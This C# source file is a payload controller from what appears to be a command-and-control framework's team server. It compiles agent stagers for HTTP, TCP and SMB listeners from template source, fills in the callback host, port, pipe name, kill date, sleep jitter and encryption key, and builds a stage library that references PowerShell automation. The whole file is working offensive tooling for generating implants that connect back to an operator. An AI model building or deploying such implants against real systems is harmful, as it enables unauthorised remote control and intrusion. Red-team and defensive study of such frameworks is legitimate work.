using Microsoft.CodeAnalysis;

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

using TeamServer.Agents;

namespace TeamServer.Controllers
{
    public class PayloadController
    {
        public static string RootDirectory { get; set; } = Assembly.GetExecutingAssembly().Location.Split("TeamServer")[0];
        public static string AgentDirectory { get; set; } = Path.Combine(RootDirectory, "TeamServer", "Agents");
        public static string ReferencesDirectory { get; set; } = Path.Combine(AgentDirectory, "References");

        public static ListenerController ListenerController { get; set; }

        public PayloadController(ListenerController listenerController)
        {
            ListenerController = listenerController;
        }

        public static byte[] GenerateStager(StagerRequest request)
        {
            var listener = ListenerController.GetListener(request.Listener);

            var stager = Array.Empty<byte>();

            switch (listener.Type)
            {
                case ListenerType.HTTP:
                    stager = GenerateStager(request, listener as ListenerHttp);
                    break;
                case ListenerType.TCP:
                    stager = GenerateStager(request, listener as ListenerTcp);
                    break;
                case ListenerType.SMB:
                    stager = GenerateStager(request, listener as ListenerSmb);
                    break;
                default:
                    break;
            }

            return stager;
        }

        private static byte[] GenerateStager(StagerRequest request, ListenerHttp listener)
        {
            var tempPath = CreateTempDirectory();
            var compilerRequest = new Compiler.CompilationRequest
            {
                AssemblyName = "AgentStager",
                OutputKind = (OutputKind)request.OutputType,
                Platform = Platform.AnyCpu,
                ReferenceDirectory = Path.Combine(ReferencesDirectory, "net40"),
                TargetDotNetVersion = (Compiler.DotNetVersion)request.TargetFramework,
                SourceDirectory = tempPath,
                References = new List<Compiler.Reference>
                {
                    new Compiler.Reference
                    {
                        File = "mscorlib.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Core.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Net.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.XML.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Runtime.Serialization.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    }
                }
            };

            CloneStagerSourceCode(listener.Type, tempPath);

            ReplaceText(tempPath, "AgentStager.cs", "<<ConnectHost>>", listener.ConnectAddress);
            ReplaceText(tempPath, "AgentStager.cs", "<<ConnectPort>>", listener.ConnectPort.ToString());
            ReplaceText(tempPath, "AgentStager.cs", "<<KillDate>>", request.KillDate.ToString());
            ReplaceText(tempPath, "AgentStager.cs", "<<SleepInterval>>", request.SleepInterval);
            ReplaceText(tempPath, "AgentStager.cs", "<<SleepJitter>>", request.SleepJitter);
            ReplaceText(tempPath, "CryptoController.cs", "<<EncKey>>", Convert.ToBase64String(Program.ServerController.CryptoController.EncryptionKey));

            var result = Compiler.Compile(compilerRequest);

            RemoveTempDirectory(tempPath);

            return result;
        }

        private static byte[] GenerateStager(StagerRequest request, ListenerTcp listener)
        {
            var tempPath = CreateTempDirectory();
            var compilerRequest = new Compiler.CompilationRequest
            {
                AssemblyName = "AgentStager",
                OutputKind = (OutputKind)request.OutputType,
                Platform = Platform.AnyCpu,
                ReferenceDirectory = Path.Combine(ReferencesDirectory, "net40"),
                TargetDotNetVersion = (Compiler.DotNetVersion)request.TargetFramework,
                SourceDirectory = tempPath,
                References = new List<Compiler.Reference>
                {
                    new Compiler.Reference
                    {
                        File = "mscorlib.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Core.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.XML.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Runtime.Serialization.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    }
                }
            };

            CloneStagerSourceCode(listener.Type, tempPath);

            ReplaceText(tempPath, "AgentStager.cs", "<<BindAddress>>", listener.BindAddress);
            ReplaceText(tempPath, "AgentStager.cs", "<<BindPort>>", listener.BindPort.ToString());
            ReplaceText(tempPath, "AgentStager.cs", "<<KillDate>>", request.KillDate.ToString());
            ReplaceText(tempPath, "CryptoController.cs", "<<EncKey>>", Convert.ToBase64String(Program.ServerController.CryptoController.EncryptionKey));

            var result = Compiler.Compile(compilerRequest);

            RemoveTempDirectory(tempPath);

            return result;
        }

        private static byte[] GenerateStager(StagerRequest request, ListenerSmb listener)
        {
            var tempPath = CreateTempDirectory();
            var compilerRequest = new Compiler.CompilationRequest
            {
                AssemblyName = "AgentStager",
                OutputKind = (OutputKind)request.OutputType,
                Platform = Platform.AnyCpu,
                ReferenceDirectory = Path.Combine(ReferencesDirectory, "net40"),
                TargetDotNetVersion = (Compiler.DotNetVersion)request.TargetFramework,
                SourceDirectory = tempPath,
                References = new List<Compiler.Reference>
                {
                    new Compiler.Reference
                    {
                        File = "mscorlib.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Core.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.XML.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Runtime.Serialization.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.IO.Pipes.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    }
                }
            };

            CloneStagerSourceCode(listener.Type, tempPath);

            ReplaceText(tempPath, "AgentStager.cs", "<<PipeName>>", listener.PipeName);
            ReplaceText(tempPath, "AgentStager.cs", "<<KillDate>>", request.KillDate.ToString());
            ReplaceText(tempPath, "CryptoController.cs", "<<EncKey>>", Convert.ToBase64String(Program.ServerController.CryptoController.EncryptionKey));

            var result = Compiler.Compile(compilerRequest);

            RemoveTempDirectory(tempPath);

            return result;
        }

        public static byte[] GenerateStage(StageRequest request)
        {
            var tempPath = CreateTempDirectory();
            var compilerRequest = new Compiler.CompilationRequest
            {
                AssemblyName = "AgentStage",
                OutputKind = OutputKind.DynamicallyLinkedLibrary,
                Platform = Platform.AnyCpu,
                ReferenceDirectory = ReferencesDirectory + Path.DirectorySeparatorChar + "net40",
                TargetDotNetVersion = (Compiler.DotNetVersion)request.TargetFramework,
                SourceDirectory = tempPath,
                References = new List<Compiler.Reference>
                {
                    new Compiler.Reference
                    {
                        File = "mscorlib.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Core.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Net.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.IO.Pipes.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.XML.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Runtime.Serialization.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Management.Automation.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    }
                }
            };
            
            CloneStageSourceCode(tempPath);

            return Compiler.Compile(compilerRequest);
        }

        private static string CreateTempDirectory()
        {
            var temp = Path.GetTempPath() + SharedHelpers.GeneratePseudoRandomString(6);
            Directory.CreateDirectory(temp);
            return temp;
        }

        private static void CloneStagerSourceCode(ListenerType type, string tempPath)
        {
            var srcPath = default(string);

            switch (type)
            {
                case ListenerType.HTTP:
                    srcPath = Path.Combine(AgentDirectory, "HTTPStager");
                    break;
                case ListenerType.TCP:
                    srcPath = Path.Combine(AgentDirectory, "TCPStager");
                    break;
                case ListenerType.SMB:
                    srcPath = Path.Combine(AgentDirectory, "SMBStager");
                    break;
            }

            // AgentType
            var srcFiles = Directory.GetFiles(srcPath, "*.cs", SearchOption.AllDirectories);

            foreach (var filePath in srcFiles)
            {
                if (filePath.Contains("AssemblyInfo.cs", StringComparison.OrdinalIgnoreCase) ||
                    filePath.Contains("AssemblyAttributes.cs", StringComparison.OrdinalIgnoreCase)) { continue; }
                var fileName = Path.GetFileName(filePath);
                var finalPath = tempPath + Path.DirectorySeparatorChar + fileName;
                File.Copy(filePath, finalPath, true);
            }

            // Stager Core
            srcPath = Path.Combine(AgentDirectory, "StagerCore");

            foreach (var filePath in Directory.GetFiles(srcPath, "*.cs", SearchOption.AllDirectories))
            {
                var fileName = Path.GetFileName(filePath);
                var finalPath = tempPath + Path.DirectorySeparatorChar + fileName;

                if (File.Exists(finalPath))
                {
                    fileName = fileName.Insert(fileName.Length - 3, SharedHelpers.GeneratePseudoRandomString(6));
                    finalPath = tempPath + Path.DirectorySeparatorChar + fileName;
                }

                File.Copy(filePath, finalPath, true);
            }
        }

        private static void CloneStageSourceCode(string tempPath)
        {
            // AgentStage

            var srcPath = Path.Combine(AgentDirectory, "AgentStage");
            var srcFiles = Directory.GetFiles(srcPath, "*.cs", SearchOption.AllDirectories);

            foreach (var filePath in srcFiles)
            {
                if (filePath.Contains("AssemblyInfo.cs", StringComparison.OrdinalIgnoreCase) ||
                    filePath.Contains("AssemblyAttributes.cs", StringComparison.OrdinalIgnoreCase)) { continue; }
                var fileName = Path.GetFileName(filePath);
                var finalPath = tempPath + Path.DirectorySeparatorChar + fileName;
                File.Copy(filePath, finalPath, true);
            }

            // Shared

            srcPath = Path.Combine(AgentDirectory, "Shared");
            srcFiles = Directory.GetFiles(srcPath, "*.cs", SearchOption.AllDirectories);

            foreach (var filePath in srcFiles)
            {
                if (filePath.Contains("AssemblyInfo.cs", StringComparison.OrdinalIgnoreCase) ||
                    filePath.Contains("AssemblyAttributes.cs", StringComparison.OrdinalIgnoreCase) ||
                    filePath.Contains("AgentCommand.cs", StringComparison.OrdinalIgnoreCase)) { continue; }

                var fileName = Path.GetFileName(filePath);
                var finalPath = tempPath + Path.DirectorySeparatorChar + fileName;
                File.Copy(filePath, finalPath, true);
            }
        }

        private static void ReplaceText(string tempPath, string filename, string originalText, string newText)
        {
            var srcPath = Path.Combine(tempPath, filename);
            var src = File.ReadAllText(srcPath);
            var newSrc = src.Replace(originalText, newText);
            File.WriteAllText(srcPath, newSrc);
        }

        private static void RemoveTempDirectory(string path)
        {
            Directory.Delete(path, true);
        }
    }
}